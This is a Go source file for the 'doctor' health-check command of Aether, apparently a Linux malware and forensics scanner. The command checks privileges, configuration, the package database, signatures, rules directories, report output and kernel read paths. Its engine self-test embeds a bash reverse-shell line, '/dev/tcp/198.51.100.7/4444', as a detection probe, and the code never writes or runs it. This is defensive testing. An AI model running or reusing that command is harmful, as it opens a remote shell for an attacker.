package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/spf13/cobra"

	"aether/internal/config"
	"aether/internal/pkgdb"
	"aether/internal/scanner"
	"aether/internal/yara"
)

// doctorCheck is one health probe result line.
type doctorCheck struct {
	Status  string // "OK" | "WARN" | "FAIL"
	Name    string
	Detail  string
	ADVISED string // remediation hint for WARN/FAIL rows
}

func renderCheck(sb *strings.Builder, c doctorCheck) {
	icon := "[ OK ]"
	switch c.Status {
	case "WARN":
		icon = "[WARN]"
	case "FAIL":
		icon = "[FAIL]"
	}
	sb.WriteString(fmt.Sprintf("%s %-14s %s\n", icon, c.Name, c.Detail))
	if c.ADVISED != "" {
		sb.WriteString(fmt.Sprintf("       └─ Fix: %s\n", c.ADVISED))
	}
}

// runDoctor executes the installation health sweep and prints the report.
// Exit code 0 when no FAIL rows; 1 otherwise.
func runDoctor() error {
	var sb strings.Builder
	sb.WriteString("Aether Installation Health Check\n")
	sb.WriteString(strings.Repeat("─", 64) + "\n")

	failCount, warnCount := 0, 0

	// 1. Privileges
	euid := os.Geteuid()
	if euid == 0 {
		renderCheck(&sb, doctorCheck{Status: "OK", Name: "Privileges", Detail: "running as root — full coverage available"})
	} else {
		renderCheck(&sb, doctorCheck{Status: "WARN", Name: "Privileges",
			Detail:  fmt.Sprintf("running as uid %d — coverage is limited (other users' files, shadow, kernel)", euid),
			ADVISED: "re-run with sudo for full coverage"})
	}

	// 2. Terminal
	if isTerminal() {
		renderCheck(&sb, doctorCheck{Status: "OK", Name: "Terminal", Detail: "interactive TTY detected — TUI available"})
	} else {
		renderCheck(&sb, doctorCheck{Status: "WARN", Name: "Terminal",
			Detail:  "stdout is not a terminal — TUI disabled, plain output enforced",
			ADVISED: "run from an interactive terminal for the full experience"})
	}

	// 3. Configuration
	cfg, cfgPath, cfgErr := config.LoadConfig("")
	if cfgErr != nil {
		failCount++
		renderCheck(&sb, doctorCheck{Status: "FAIL", Name: "Configuration",
			Detail:  "config file failed to parse: " + cfgErr.Error(),
			ADVISED: "fix the YAML syntax in the reported file, or remove it to use defaults"})
	} else if cfgPath != "" {
		renderCheck(&sb, doctorCheck{Status: "OK", Name: "Configuration", Detail: "loaded " + cfgPath})
	} else {
		renderCheck(&sb, doctorCheck{Status: "OK", Name: "Configuration", Detail: "no config file — built-in defaults in use"})
	}
	_ = cfg

	// 4. Package database (ownership verification + trojan detection)
	db := pkgdb.New("")
	db.IsAvailable()
	if db.IsAvailable() {
		renderCheck(&sb, doctorCheck{Status: "OK", Name: "Package DB", Detail: db.StatusNote()})
	} else {
		warnCount++
		renderCheck(&sb, doctorCheck{Status: "WARN", Name: "Package DB",
			Detail:  db.StatusNote(),
			ADVISED: "package ownership verification and trojaned-binary detection are disabled on this host"})
	}

	// 5. Signature engine
	renderCheck(&sb, doctorCheck{Status: "OK", Name: "Signatures", Detail: yara.VersionInfo()})

	// 6. Rules directories
	for _, dir := range []string{"/etc/aether/rules", filepath.Join(os.Getenv("HOME"), ".config", "aether", "rules")} {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		yarCount := 0
		for _, e := range entries {
			if strings.HasSuffix(e.Name(), ".yar") || strings.HasSuffix(e.Name(), ".yara") {
				yarCount++
			}
		}
		if yarCount > 0 {
			renderCheck(&sb, doctorCheck{Status: "OK", Name: "Rules Dir", Detail: fmt.Sprintf("%s (%d rule files)", dir, yarCount)})
		} else {
			renderCheck(&sb, doctorCheck{Status: "WARN", Name: "Rules Dir", Detail: dir + " exists but contains no rule files"})
		}
	}

	// 7. Engine self-test: the detection pipeline must catch a known payload
	// in memory (read-only, nothing is written or executed).
	probeCfg := config.NewDefaultConfig()
	probe := []byte("#!/bin/bash\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n")
	match := scanner.CheckSuspiciousScriptContent("/tmp/aether-doctor-probe.sh", probe, nil, probeCfg)
	if match != nil {
		renderCheck(&sb, doctorCheck{Status: "OK", Name: "Engine Self-Test",
			Detail: fmt.Sprintf("detection pipeline functional (%s matched)", match.Name)})
	} else {
		failCount++
		renderCheck(&sb, doctorCheck{Status: "FAIL", Name: "Engine Self-Test",
			Detail:  "known probe payload was NOT detected — the detection pipeline is non-functional",
			ADVISED: "reinstall: sudo make install — if the failure persists, file a bug report"})
	}

	// 8. Report output writability
	probePath := "aether-report.html"
	f, err := os.OpenFile(filepath.Dir(probePath)+string(os.PathSeparator)+".aether-doctor-write-probe", os.O_CREATE|os.O_WRONLY, 0600)
	if err == nil {
		_ = f.Close()
		_ = os.Remove(filepath.Dir(probePath) + string(os.PathSeparator) + ".aether-doctor-write-probe")
		renderCheck(&sb, doctorCheck{Status: "OK", Name: "Report Output", Detail: "current directory is writable — HTML report can be written"})
	} else {
		renderCheck(&sb, doctorCheck{Status: "WARN", Name: "Report Output",
			Detail:  "current directory is not writable — automatic HTML report will fail",
			ADVISED: "run from a writable directory, or pass --html-out <path>"})
	}

	// 9. Forensic read paths
	for _, p := range []string{"/proc/modules", "/proc/kallsyms", "/proc/net/tcp"} {
		if _, err := os.Stat(p); err != nil {
			renderCheck(&sb, doctorCheck{Status: "WARN", Name: "Kernel Reads",
				Detail:  p + " not readable — kernel module checks will be limited",
				ADVISED: "run with sudo"})
			break
		}
	}

	sb.WriteString(strings.Repeat("─", 64) + "\n")
	// Count rendered rows — single source of truth, no bookkeeping drift.
	failCount = strings.Count(sb.String(), "[FAIL]")
	warnCount = strings.Count(sb.String(), "[WARN]")
	switch {
	case failCount > 0:
		sb.WriteString(fmt.Sprintf("RESULT: %d FAIL, %d WARN — installation needs attention\n", failCount, warnCount))
	case warnCount > 0:
		sb.WriteString(fmt.Sprintf("RESULT: 0 FAIL, %d WARN — functional with limitations\n", warnCount))
	default:
		sb.WriteString("RESULT: all checks passed — installation fully healthy\n")
	}
	sb.WriteString(strings.Repeat("─", 64) + "\n")

	fmt.Print(sb.String())
	if failCount > 0 {
		return fmt.Errorf("doctor found %d failing check(s)", failCount)
	}
	return nil
}

// doctorCmd builds the installation health-check command.
func doctorCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "doctor",
		Short: "Verify installation health: privileges, signatures, package databases, engine self-test",
		Long: `Runs a read-only sweep of everything Aether needs to function correctly:
privileges, terminal, configuration, package manager databases, signature
engine, rules directories, detection-pipeline self-test, report output
writability, and kernel forensic read paths. Every failing check prints a
concrete fix. Nothing on the system is modified.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			cmd.SilenceUsage = true
			return runDoctor()
		},
	}
}
